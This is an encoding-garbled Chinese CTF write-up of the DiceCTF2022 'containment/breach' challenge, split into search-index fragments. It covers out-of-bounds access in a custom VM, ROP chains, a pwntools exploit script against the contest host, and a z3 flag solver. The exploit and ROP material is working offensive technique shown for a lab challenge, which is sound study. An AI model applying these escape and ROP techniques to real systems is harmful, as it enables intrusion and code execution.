printf(\"r%d = 0x%lx\\n\", code[pc + 1] \u0026 0xF, Reg_list[code[pc + 1] \u0026 0xF]); pc += 2LL; break; } } return 0; } è™šæ‹Ÿæœºå…±16ä¸ª64ä½å¯„å­˜å™¨ï¼ˆR0-R15ï¼‰åœ¨bssæ®µï¼Œå…¶ä¸­R15ä¸ºrspï¼Œä»£ç æ®µcsåœ¨å †ä¸Šï¼Œæ•°æ®æ®µå’Œæ ˆæ®µä¸ºåŒä¸€ä¸ªåœ¨bssä¸­ã€‚å…±å®ç°äº†11ä¸ªæŒ‡ä»¤ï¼š hlt exited æ ‡å¿—è®¾ä¸º1ï¼Œåœæ­¢æ‰§è¡Œ mov reg, imm ç«‹å³æ•°ä¼ é€ mov reg, reg å¯„å­˜å™¨å€¼ä¼ é€ alu dst, src å¯¹ä¸¤å¯„å­˜å™¨çš„å€¼è¿›è¡Œè®¡ç®— mov ds:[dst], src srcå¯„å­˜å™¨çš„å€¼ï¼Œé€å…¥dsæ®µåŸºå€+dstå€¼åç§»çš„åœ°å€ä¸­ mov dst, ds:[src] åŠ è½½dsæ®µåŸºå€+srcå€¼åç§»çš„åœ°å€çš„å€¼åˆ°dstå¯„å­˜å™¨ mov dst, cs:[src] åŠ è½½csæ®µåŸºå€+srcå€¼åç§»çš„åœ°å€çš„å€¼åˆ°dstå¯„å­˜å™¨ jmp imm è·³è½¬åˆ°æŒ‡å®špc jmp reg è·³è½¬åˆ°å¯„å­˜å™¨æŒ‡å®šå€¼å¤„ jeq r1, r2, imm ç›¸ç­‰åˆ™è·³è½¬ puts reg è¾“å‡ºæŒ‡å®šå¯„å­˜å™¨çš„å€¼ ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:1:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#ç¨‹åºåˆ†æ"},{"categories":["Writeups"],"content":"Pwn","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:2:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#pwn"},{"categories":["Writeups"],"content":"æŒ‡ä»¤åˆ†æè™½ç„¶ä½œè€…åœ¨èµ›åç»™å‡ºäº†æ±‡ç¼–æ–‡ä»¶ï¼Œä½†æ˜¯ä¸ªäººçœ‹ç€ä¸ä¹ æƒ¯ï¼Œåˆå°†breach.binè‡ªå·±è¿›è¡Œäº†ç¿»è¯‘ï¼Œæ›´æ¥è¿‘x86æ±‡ç¼–ã€‚ è™šæ‹Ÿæœºæœ¬èº«çš„æ¼æ´ç‚¹åœ¨è®¿é—®å†…å­˜æ—¶æ²¡æœ‰æ£€æŸ¥åç§»çš„èŒƒå›´ï¼Œé€ æˆé€šè¿‡ä»£ç æ®µcså’Œæ•°æ®æ®µdsè¶Šç•Œè¯»å†™ã€‚csåœ¨å †ä¸Šï¼Œdsåœ¨bssä¸­ã€‚dsçš„é™„è¿‘æœ‰libcå’Œé‡è¦çš„åœ°å€ä¿¡æ¯ï¼Œå¯ä»¥æ³„éœ²å„éƒ¨åˆ†çš„åŸºå€ã€‚ è¯»å–è®¡ç®—åç§»å³å¯å®ç°ä»»æ„åœ°å€è¯»å†™ã€‚ breach.binä¸­ä¸ºä½œè€…çš„payloadã€‚å®ƒå®ç°äº†è™šæ‹Ÿæœºçš„é€ƒé€¸ï¼Œç„¶åå°†æ ˆè¿ç§»åˆ°å †ä¸Šï¼Œæ¶ˆé™¤äº†æ ˆåœ°å€çš„ä¸ç¡®å®šï¼Œåªéœ€è¦å‘fake-stackä¸­å†™å…¥ropï¼Œå°±å¯ä»¥å®ç°è™šæ‹Ÿæœºä¸æ”¯æŒçš„åŠŸèƒ½ï¼Œç„¶ååˆå›åˆ°è™šæ‹Ÿæœºä¸­ç»§ç»­æ‰§è¡Œã€‚ breach.binçš„å„ä¸ªå‡½æ•°åœ°å€éƒ½æ˜¯å›ºå®šçš„ï¼Œé€šè¿‡jmpå¯ä»¥ç›´æ¥è°ƒç”¨ã€‚å¦‚æœéœ€è¦è¿”å›éœ€è¦æå‰å°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å†™å…¥æ ˆä¸­ã€‚å¦‚ç¨‹åºå¼€å§‹è¿™æ®µã€‚ [0x0000] (1) :: mov r15, 0x10000 ; r15 = 0x10000 ; call [0x0009] (1) :: mov r0, 0x8 ; r0 = 0x8 [0x0012] (3) :: sub r15, r0 ; r0 = 0x8, r15 = 0xfff8 [0x0014] (1) :: mov r0, 0x28 ; r0 = 0x28, r15 = 0xfff8 [0x001d] (4) :: mov ds:[r15], r0 ; ds:[0xfff8] = 0x28 [0x001f] (7) :: jmp 0x59 ; ret [0x23bd] (5) :: mov r1, ds:[r15] [0x23bf] (1) :: mov r0, 0x8 [0x23c8] (3) :: add r15, r0 [0x23ca] (8) :: jmp r1 breach.binå…ˆè®¡ç®—mainå‡½æ•°çš„è¿”å›åœ°å€ç„¶åé€šè¿‡stack_povit [0x276d]ï¼Œå†™æ ˆåŠ«æŒçš„ropã€‚ä¹‹åå°±æ˜¯ä¸æ–­åœ¨fake_stackä¸­å†™ropã€‚ åœ¨ç¨‹åºä¸­ï¼Œå¯¹gadgetå’Œä¸€äº›strè¿›è¡Œäº†ç®€å•çš„å¼‚æˆ–æ“ä½œï¼Œ(val | (type\u003c\u003c56) )^0x676e614765636944ï¼Œtypeæ ‡è¯†äº†è¿™ä¸ªæ•°æ®æ˜¯ç«‹å³æ•°ï¼ˆ0x00ï¼‰ï¼Œlibcåç§»ï¼ˆ0x34ï¼‰ï¼Œç¨‹åºåç§»ï¼ˆ0x56ï¼‰æˆ–è·³è¿‡ï¼ˆ0x99ï¼‰ã€‚0xdeadbeefdeadbeef ^ 0x676e614765636944ä»£è¡¨è¿™æ®µæ•°æ®å†™å®Œäº†ï¼Œå¯ä»¥é€€å‡ºå¾ªç¯äº†ã€‚ å¯¹åº”çš„æ±‡ç¼–å¦‚ä¸‹ï¼š [0x2681] (6) :: mov r0, cs:[r5] ; å–æ•°æ®åˆ°r0 [0x2683] (1) :: mov r1, 0x676e614765636944 [0x268c] (3) :: xor r0, r1 ; å¾—åˆ°åŸå§‹æ•°æ® [0x268e] (1) :: mov r1, 0xdeadbeefdeadbeef ; æ˜¯å¦ç»“æŸ [0x2697] (9) :: jeq r0, r1, 0x2745 [0x26a1] (2) :: mov r6, r0 [0x26a3] (2) :: mov r7, r0 [0x26a5] (1) :: mov r0, 0xffffffffffffff ; å–å¾—val [0x26ae] (3) :: and r6, r0 [0x26b0] (1) :: mov r0, 0x38 [0x26b9] (3) :: shr r7, r0 ; å–å¾—type [0x26bb] (1) :: mov r0, 0x0 [0x26c4] (9) :: jeq r7, r0, 0x26fd ; immï¼Ÿ [0x26ce] (1) :: mov r0, 0x34 [0x26d7] (9) :: jeq r7, r0, 0x2708 ; libc gadgetï¼Ÿ [0x26e1] (1) :: mov r0, 0x56 [0x26ea] (9) :: jeq r7, r0, 0x2717 ; text gadgetï¼Ÿ [0x26f4] (7) :: jmp 0x2726 [0x26fd] (4) :: mov ds:[r4], r6 [0x26ff] (7) :: jmp 0x2726 [0x2708] (2) :: mov r0, r2 ; r2 = libc base [0x270a] (3) :: add r0, r6 [0x270c] (4) :: mov ds:[r4], r0 [0x270e] (7) :: jmp 0x2726 [0x2717] (2) :: mov r0, r3 ; r3 = text base [0x2719] (3) :: add r0, r6 [0x271b] (4) :: mov ds:[r4], r0 [0x271d] (7) :: jmp 0x2726 [0x2726] (1) :: mov r0, 0x8 ; ç§»åŠ¨æŒ‡å‘fake stackå’Œcsæ•°æ®çš„æŒ‡é’ˆ [0x272f] (3) :: add r5, r0 [0x2731] (1) :: mov r0, 0x8 [0x273a] (3) :: add r4, r0 [0x273c] (7) :: jmp 0x2681 [0x2745] (5) :: mov r7, ds:[r15] ; ç§»åŠ¨æŒ‡é’ˆï¼Œå¹¶retï¼Œä»æ ˆä¸­å–å¾—pcï¼Œjmp [0x2747] (1) :: mov r0, 0x8 [0x2750] (3) :: add r15, r0 [0x2752] (5) :: mov r6, ds:[r15] [0x2754] (1) :: mov r0, 0x8 [0x275d] (3) :: add r15, r0 [0x275f] (5) :: mov r1, ds:[r15] [0x2761] (1) :: mov r0, 0x8 [0x276a] (3) :: add r15, r0 [0x276c] (8) :: jmp r1 ; 0x2658 [0x2658] (0) :: hlt ; trigger æ‰§è¡Œropåï¼Œå°†å¾ªç¯æ ‡å¿—ç½®é›¶ï¼Œè®¾ç½®raxä¸ºtext+193Bï¼Œcall raxç»§ç»­è¿è¡Œè™šæ‹Ÿæœºã€‚breach.binè¿˜å®ç°äº†è¾ƒä¸ºé€šç”¨çš„syscallå‡½æ•°ï¼Œå¯ä»¥è®¾ç½®å¤šä¸ªå‚æ•°ã€‚é€šè¿‡å‡ ä¸ªgadgetè®¾ç½®å¯„å­˜å™¨çš„å€¼ï¼Œç„¶åé€šè¿‡åœ¨å›ºå®šçš„æ ˆå¸§å†™å€¼å³å¯å®ç°ï¼Œæ§åˆ¶å¯„å­˜å™¨å®ç°syscallã€‚åœ¨ropé“¾æ•°æ®åŒºå°†å¯¹åº”çš„ä½ç½®ç©ºå‡ºã€‚ [0x2353] (1) :: mov r0, 0x8008 [0x235c] (4) :: mov ds:[r0], r12 ; fake_stack[1] [0x235e] (1) :: mov r0, 0x8018 [0x2367] (4) :: mov ds:[r0], r13 ; fake_stack[3] [0x2369] (1) :: mov r0, 0x8050 [0x2372] (4) :: mov ds:[r0], r8 ; fake_stack[10] [0x2374] (1) :: mov r0, 0x8060 [0x237d] (4) :: mov ds:[r0], r9 ; fake_stack[12] [0x237f] (1) :: mov r0, 0x8070 [0x2388] (4) :: mov ds:[r0], r10 ; fake_stack[14] [0x238a] (1) :: mov r0, 0x8080 [0x2393] (4) :: mov ds:[r0], r11 ; fake_stack[16] [0x2395] (1) :: mov r4, 0x287b [0x239e] (1) :: mov r0, 0x8 [0x23a7] (3) :: sub r15, r0 [0x23a9] (1) :: mov r0, 0x23bd [0x23b2] (4) :: mov ds:[r15], r0 [0x23b4] (7) :: jmp 0x2504 [0x2504] (2) :: mov r5, r4 ; r5 = 0x287b _rop_syscall [0x2506] (1) :: mov r4, 0x8000 [0x250f] (1) :: mov r0, 0x8 [0x2518] (3) :: sub r15, r0 [0x251a] (1) :: mov r0, 0x252e [0x2523] (4) :: mov ds:[r15], r0 [0x2525] (7) :: jmp 0x2667 ; å†™ropé“¾ ä¸‹é¢æ˜¯å…¶ropé“¾ï¼š ; è¿›è¡Œç³»ç»Ÿè°ƒç”¨ rop_syscall: pop rdx pop rcx pop rbx ret empty empty empty pop rax ret ret mov r10, rdx jmp rax mov r8, rbx mov rax, r8 pop rbx ret empty pop rax ret empty pop rdi ret empty pop rsi ret empty pop rdx pop rcx pop rbx ret empty empty empty syscall ret pop rbx ret textg: 0x140a0 mov qword ptr [rbx], rax pop rax pop rdx pop rbx ret const: 0x0 const: 0x0 const: 0x0 ; å°†å¾ªç¯æ ‡å¿—ç½®é›¶ï¼Œè¿”å›mainç»§ç»­æ‰§è¡Œ ret_main: pop rax ret textg: 0x193b pop rd","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:2:1","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#æŒ‡ä»¤åˆ†æ"},{"categories":["Writeups"],"content":"Vulnä¸‹é¢é€šè¿‡è°ƒè¯•å¯»æ‰¾åˆ©ç”¨ç‚¹ã€‚æˆ‘ä»¬å‘ç°ä¸»ç¨‹åºè¯»å–è¾“å…¥åˆ°å †ä¸Šçš„cså¤´éƒ¨ã€‚åˆ†ææŒ‡ä»¤ [0x1eaa] (1) :: mov r0, 0x1 [0x1eb3] (9) :: jeq r8, r0, 0x2085 ; ret [0x2085] (5) :: mov r1, ds:[r15] [0x2087] (1) :: mov r0, 0x8 [0x2090] (3) :: add r15, r0 [0x2092] (8) :: jmp r1 ; 0x28 çˆ¶è¿›ç¨‹ä¼šåœ¨0x1eaaå¤„æ¯”è¾ƒr8ä¸1ï¼Œè€Œr8æ˜¯ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼ã€‚å¦‚æœè¿”å›å€¼ä¸º1ï¼Œåˆ™ä¼šåˆ°0x2085æ‰§è¡Œï¼Œç„¶åè¿”å›åˆ°0x28å¤„ã€‚æˆ‘ä»¬å¯ä»¥æº¢å‡ºåˆ°0x28ï¼Œä½¿å¾—çˆ¶è¿›ç¨‹æ‰§è¡Œä»»æ„çš„æŒ‡ä»¤ã€‚ æ­¤æ—¶çš„è™šæ‹Ÿæœºå¯„å­˜å™¨ï¼š ''' r0 = 0x8 r1 = 0x28 r2 = libc base r3 = text base r4 = (fake_stack - data segment) + 0x150 r5 = offset(cs data - cs) r6 = text base r7 = stack return addr r8 = 1 ; rax r9 = 0 ; rdi r10 = 0x7fb0 ; rsi r11 = fake_stack ; rdx ''' æˆ‘ä»¬æœ‰56å­—èŠ‚çš„ç©ºé—´ï¼Œè™šæ‹Ÿæœºçš„ä»»ä½•ç³»ç»Ÿè°ƒç”¨éƒ½è¦ä½¿ç”¨fake_stackå®Œæˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨è™šæ‹Ÿæœºå®ç°çš„syscallè°ƒç”¨readï¼Œå‘fake_stackå†™å…¥ropé“¾ï¼Œä»è€Œæ§åˆ¶çˆ¶è¿›ç¨‹ã€‚ æ§åˆ¶çˆ¶è¿›ç¨‹åï¼Œç”±äºä¸èƒ½ä½¿ç”¨openï¼Œè¿˜æ˜¯ä¸èƒ½æ‰“å¼€flagã€‚ä½†æ˜¯å­è¿›ç¨‹æ²¡æœ‰è¿™ä¸ªé™åˆ¶ï¼Œåœ¨straceä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å­è¿›ç¨‹ä¼šå…ˆè¯»å–çˆ¶è¿›ç¨‹ä¼ é€’çš„è¾“å…¥çš„sizeï¼Œè€Œä¸”è°ƒè¯•åå¯ä»¥å‘ç°å­è¿›ç¨‹ä¹Ÿæ˜¯å‘ä»£ç æ®µè¯»å–è¾“å…¥ï¼Œå¹¶ä¸”ä¼šå›åˆ°0x4bcæ‰§è¡Œè™šæ‹ŸæœºæŒ‡ä»¤ã€‚åŒç†æˆ‘ä»¬å¯ä»¥ç»™å­è¿›ç¨‹ä¸€ä¸ªå¾ˆå¤§çš„sizeï¼Œå‘é€payloadè¦†ç›–å­è¿›ç¨‹çš„è™šæ‹ŸæœºæŒ‡ä»¤ï¼Œç„¶ååœ¨å­è¿›ç¨‹ä¸­å®ç°fake_stackçš„æ ˆæº¢å‡ºã€‚ä»è€Œæ§åˆ¶å­è¿›ç¨‹è¯»å–flagï¼Œå¹¶è¿”å›ç»™çˆ¶è¿›ç¨‹ã€‚çˆ¶è¿›ç¨‹è¯»å–å¹¶è¾“å‡ºå³å¯ã€‚ ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:2:2","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#vuln"},{"categories":["Writeups"],"content":"Exp from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './breach' libc = './libc.so.6' context.terminal = ['tmux', 'splitw', '-h'] # context.binary = binary # context.log_level='debug' # p = gdb.debug([\"./breach\", \"./breach.bin\"], ''' # b fopen # follow child # ''') p = remote('mc.ax', 31618) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) alu_list = { \"+\": 0, \"-\": 1, \"*\": 2, \"%\": 3, \"\u0026\": 4, \"|\": 5, \"^\": 6, \"\u003e\u003e\": 7 } def Exit(): # 1 return \"\\x00\" def Mov_r_i(dst, imm): # 9 opcode = p8((dst\u003c\u003c4)+1) + p64(imm) return opcode def Mov_r_r(dst, src): # 2 opcode = p8(2) + p8((src\u003c\u003c4) + dst) return opcode def Alu(op, dst, src): # 2 opcode = p8((alu_list[op]\u003c\u003c4)+3) + p8((src\u003c\u003c4) + dst) return opcode def Mov_d_r(dst, src): # 2 opcode = p8(4) + p8((src\u003c\u003c4) + dst) return opcode def Mov_r_d(dst, src): # 2 opcode = p8(5) + p8((dst\u003c\u003c4) + src) return opcode def Mov_r_c(dst, src): # 2 opcode = p8(6) + p8((dst\u003c\u003c4) + src) return opcode def Jmp_i(imm): # 9 opcode = p8(7) + p64(imm) return opcode def Jmp_r(reg): opcode = p8((reg\u003c\u003c4)+8) return opcode def Cmp_j(dst, src, imm): opcode = p8(9) + p8((dst\u003c\u003c4) + src) + p64(imm) return opcode def Show(reg): opcode = p8(10) + p8(reg) return opcode def Showall(): opcode = '' for i in range(10): opcode += p8(10) + p8(i) return opcode ''' r0 = 0x8 r1 = 0x28 r2 = libc base r3 = text base r4 = (fake_stack - data segment) + 0x150 r5 = offset(csdata - cs) r6 = text base r7 = stack return addr r8 = 1 ; rax r9 = 0 ; rdi r10 = 0x7fb0 ; rsi r11 = fake_stack ; rdx ''' insns = 'a'*0x28 insns += Show(2) insns += Show(11) # read(0, fake_stack, 0x2873) insns += Mov_r_r(8, 9) # rax = 0 rdi = 0 insns += Mov_r_r(10, 11) # rsi = fake_stack insns += Mov_r_r(11, 5) # rdx = 0x2873 insns += Jmp_i(0x2353) p.sendafter(\": \", insns) p.sendafter(\": \", \"\\n\") # trigger p.recvuntil(\"r2 = 0x\") libc_base = int(p.recvuntil(\"\\n\", drop=True), 16) leak('libc base', libc_base) p.recvuntil(\"r11 = 0x\") fake_stack = int(p.recvuntil(\"\\n\", drop=True), 16) leak('fake_stack', fake_stack) pop_rdi = libc_base + 0x0000000000026b72 pop_rsi = libc_base + 0x0000000000027529 pop_rdx_r12 = libc_base + 0x000000000011c371 # Now, we control parent to interactive with child # give it a large size to overflow child's rom and control it payload = \"a\"*0xa0 # parent read size payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x8)*2 + p64(libc_base+libc.sym[\"read\"]) # write(5, fake_stack, 8) to child payload += p64(pop_rdi) + p64(5) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x8)*2 + p64(libc_base+libc.sym[\"write\"]) # parent read payload payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym[\"read\"]) # write(5, fake_stack, 0x1000) to child payload += p64(pop_rdi) + p64(5) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym[\"write\"]) # parent read orw payload payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym[\"read\"]) # write(5, fake_stack, 0x1000) to child payload += p64(pop_rdi) + p64(5) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym[\"write\"]) # read flag from child payload += p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x30)*2 + p64(libc_base+libc.sym[\"read\"]) # write flag to stdout payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x30)*2 + p64(libc_base+libc.sym[\"write\"]) sleep(0.5) p.sendline(payload) sleep(0.5) p.send(p64(0x1000)) # size # payload read(4, cs, 0x30) child_insns = \"a\"*0x4bc child_insns += Mov_r_i(8, 0) # rax = 0 child_insns += Mov_r_i(9, 4) # rdi = 0 child_insns += Mov_r_i(10, fake_stack) # rsi = fake_stack child_insns += Mov_r_i(11, 0x1000) # rdx = 0x1000 child","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:2:3","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#exp"},{"categories":["Writeups"],"content":"Revé€šè¿‡ä¹‹å‰çš„åˆ†æï¼Œå­è¿›ç¨‹æ£€æŸ¥äº†æˆ‘ä»¬çš„è¾“å…¥ï¼Œé€†å‘çš„éƒ¨åˆ†å°±åœ¨è¿™é‡Œã€‚ ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:3:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#rev"},{"categories":["Writeups"],"content":"æŒ‡ä»¤åˆ†æ child_main: [0x019e] (1) :: mov r8, 0x2004 [0x01a7] (1) :: call close_ptr [0x01c6] (1) :: mov r8, 0x2008 [0x01cf] (1) :: call close_ptr [0x01ee] (1) :: mov r8, 0x0 [0x01f7] (1) :: call close [0x0216] (1) :: mov r8, 0x1 [0x021f] (1) :: call close [0x023e] (7) :: jmp child_handler å­è¿›ç¨‹å…³é—­äº†pipeå’Œæ ‡å‡†è¾“å…¥è¾“å‡ºã€‚æ¥ç€åˆè°ƒç”¨äº†patch_cmd ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:3:1","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#æŒ‡ä»¤åˆ†æ-1"},{"categories":["Writeups"],"content":"patch_cmd patch_cmd: [0x0247] (1) :: mov r8, 0xa [0x0250] (1) :: mov r9, 0x1000 [0x0259] (3) :: add r9, r3 [0x025b] (1) :: mov r10, 0x2000 [0x0264] (1) :: mov r11, 0x7 [0x026d] (1) :: call do_syscall ; mprotect(text_base + 0x1000, 0x2000, 7) [0x028c] (1) :: mov r0, 0x2020 [0x0295] (5) :: mov r1, ds:[r0] ; code_ptr [0x0297] (1) :: mov r0, 0x2a23 [0x02a0] (3) :: add r1, r0 ; code_ptr + 0x2a23 [0x02a2] (2) :: mov r9, r1 [0x02a4] (1) :: mov r8, 0x1a00 [0x02ad] (3) :: add r8, r3 ; text_base + 0x1a00 [0x02af] (1) :: mov r1, 0x2bf6 [0x02b8] (1) :: mov r0, 0x2a23 [0x02c1] (3) :: sub r1, r0 ; size [0x02c3] (1) :: mov r0, 0x3 [0x02cc] (3) :: shr r1, r0 ; size // 8 [0x02ce] (2) :: mov r10, r1 [0x02d0] (1) :: call memcpy ; memcpy(text_base + 0x1a00, code_ptr + 0x2a23, 0x1d3) [0x02ef] (1) :: mov r9, 0xfffff9bcfffff7c8 [0x02f8] (1) :: mov r8, 0x2068 [0x0301] (3) :: add r8, r3 [0x0303] (1) :: call write_mem ; change jmp table Show --\u003e text_base + 0x1a00 [0x0322] (1) :: mov r8, 0xa [0x032b] (1) :: mov r9, 0x1000 [0x0334] (3) :: add r9, r3 [0x0336] (1) :: mov r10, 0x2000 [0x033f] (1) :: mov r11, 0x5 [0x0348] (1) :: call do_syscall ; mprotect(text_base + 0x1000, 0x2000, 5) [0x0367] (5) :: ret ä»breach.bindçš„0x2a23å¤„çš„0x1d3å­—èŠ‚çš„ä»£ç å¤åˆ¶åˆ°text_base + 0x1a00å¤„ï¼Œåˆä¿®æ”¹äº†0xaå·æŒ‡ä»¤çš„åç§»è¡¨ï¼Œä½¿å…¶åœ¨å¤„ç†çš„æ—¶å€™ä¼šè·³è½¬åˆ°text_base + 0x1a00ã€‚ç›¸å½“äºpatchäº†0xaå·æŒ‡ä»¤ã€‚ dumpå¯¹åº”æŒ‡ä»¤ï¼Œè¿›è¡Œåˆ†æï¼š __int64 __fastcall sub_1A0A(__int64 var) { __int64 stack_pointer; // rdx char op; // bl __int64 result; // rax LOBYTE(var) = *(_BYTE *)(MEMORY[0x140E0] + MEMORY[0x4040] + 1i64);// code + pc + 1 stack_pointer = MEMORY[0x7060]; // init: 0x3008 op = *(_BYTE *)(MEMORY[0x140E0] + MEMORY[0x4040]) \u003e\u003e 4; if ( op ) { switch ( op ) { case 1: *(_BYTE *)(MEMORY[0x7060] + 0x4060i64) = var; MEMORY[0x7060] = stack_pointer + 1; break; case 2: *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) += *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64); MEMORY[0x7060] = stack_pointer - 1; break; case 3: *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) *= *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64); MEMORY[0x7060] = stack_pointer - 1; break; case 4: *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) ^= *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64); MEMORY[0x7060] = stack_pointer - 1; break; case 5: *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64) = *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64) == 0; break; case 6: *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) \u0026= *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64); MEMORY[0x7060] = stack_pointer - 1; break; case 7: LOBYTE(var) = 8 * var; *(_QWORD *)(var + 0x14060) = *(unsigned __int8 *)(MEMORY[0x7060] + 0x405Fi64);// set reg MEMORY[0x7060] = stack_pointer - 1; break; case 8: MEMORY[0x7060] = 0x3008i64; break; } } else { LOBYTE(var) = 8 * var; *(_BYTE *)(MEMORY[0x7060] + 0x4060i64) = *(_BYTE *)(var + 0x14060);// load reg MEMORY[0x7060] = stack_pointer + 1; } result = MEMORY[0x4040] + 2i64; // pc+2 MEMORY[0x4040] += 2i64; return result; } ç»è¿‡åˆ†æå¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªç®€å•çš„å­—èŠ‚æ ˆæœºå™¨ï¼ŒMEMORY[0x7060]ï¼Œå³rspåˆå§‹ä¸º0x3008ï¼ŒæŒ‡å‘å¾…æ“ä½œçš„æ ˆå¸§ã€‚ Low +-----+ | | \u003c-- var1 0x405Ei64 +-----+ | | \u003c-- var2 0x405Fi64 +-----+ | | \u003c-- stack_pointer +-----+ | | High +-----+ æŒ‡ä»¤é›†å¦‚ä¸‹ï¼š op instruction æè¿° 0 ex.push reg å¯„å­˜å™¨çš„æœ€ä½å­—èŠ‚å…¥æ ˆ 1 ex.push imm ç«‹å³æ•°å…¥æ ˆ 2 ex.add æ ˆé¡¶ä¸Šæ–¹ä¸¤æ•°ç›¸åŠ  3 ex.mul æ ˆé¡¶ä¸Šæ–¹ä¸¤æ•°ç›¸ä¹˜ 4 ex.xor æ ˆé¡¶ä¸Šæ–¹ä¸¤æ•°å¼‚æˆ– 5 ex.eqz æ ˆé¡¶ä¸Šæ–¹çš„æ•°æ˜¯å¦ä¸º0 6 ex.and æ ˆé¡¶ä¸Šæ–¹ä¸¤æ•°ç›¸ä¸ 7 ex.pop æ ˆé¡¶ä¸Šæ–¹çš„æ•°å¼¹å‡ºåˆ°å¯„å­˜å™¨ 8 ex.reset è®¾ç½®æ ˆæŒ‡é’ˆä¸º0x3008 é‡æ–°å¯¹flagæ£€æŸ¥éƒ¨åˆ†è¿›è¡Œåˆ†æï¼š check_flag: mov r0, 0x0 mov r8, cs:[r0] mov r0, 0xffffffffff and r8, r0 mov r0, 0x7b65636964 ; 'dice{' jeq r8, r0, deep_check jmp check_end_false deep_check: ex.reset mov r0, 0x7 mov r8, cs:[r0] mov r0, 0x1 mov r9, cs:[r0] mov r0, 0x11 mov r10, cs:[r0] mov r0, 0xf mov r11, cs:[r0] ex.push r8 ex.push r9 ex.add ex.push 0x2c ex.add ex.push r10 ex.push r11 ex.add ex.push 0xd8 ex.xor ex.xor ex.push 0x10 ex.xor ex.push 0xd6 ex.xor ex.eqz mov r0, 0x1 mov r8, cs:[r0] mov r0, 0x5 mov r9, cs:[r0] mov r0, 0xd mov r10, cs:[r0] mov r0, 0xe mov r11, cs:[r0] ex.push r8 ex.push r9 ex.xor ex.push 0xd6 ex.xor ex.push r10 ex.push r11 ex.xor ex.push 0x70 ex.add ex.add ex.push 0xe5 ex.xor ex.push 0xa6 ex.xor ex.eqz ; ... mov r0, 0x24 mov r8, cs:[r0] mov r0, 0x18 mov r9, cs:[r0] mov r0","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:3:2","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#patch_cmd"},{"categories":["Writeups"],"content":"z3-sloveræ ¹æ®è¿™79ä¸ªçº¦æŸå¯ä»¥ä½¿ç”¨z3æ¥å¿«é€Ÿæ±‚è§£ï¼š from z3 import * def get_op(): line = f.readline() if \"add\" in line: return '+' elif \"mul\" in line: return '*' elif \"xor\" in line: return '^' elif \"and\" in line: return '\u0026' def get_imm(): line = f.readline() return int(line[10:], 16) slov = Solver() flag = [] for i in range(0x24+1): flag.append(BitVec(f'x{i}', 8)) slov.add(flag[0] == ord(\"d\")) slov.add(flag[1] == ord(\"i\")) slov.add(flag[2] == ord(\"c\")) slov.add(flag[3] == ord(\"e\")) slov.add(flag[4] == ord(\"{\")) slov.add(flag[0x24] == ord('}')) f = open(\"./test.txt\", \"r\") for i in range(79): line = f.readline() r8 = int(line[10:], 16) f.readline() line = f.readline() r9 = int(line[10:], 16) f.readline() line = f.readline() r10 = int(line[10:], 16) f.readline() line = f.readline() r11 = int(line[10:], 16) f.readline() # print(\"r8: {}, r9: {}, r10: {}, r11: {}\".format(r8, r9, r10, r11)) f.readline() f.readline() op1 = get_op() imm1 = get_imm() op2 = get_op() f.readline() f.readline() op3 = get_op() imm2 = get_imm() op4 = get_op() op5 = get_op() imm3 = get_imm() op6 = get_op() imm4 = get_imm() f.readline() f.readline() # eqz eq = f'((((flag[{r8}] {op1}flag[{r9}]) {op2}{imm1}) {op5}((flag[{r10}] {op3}flag[{r11}]) {op4}{imm2})) 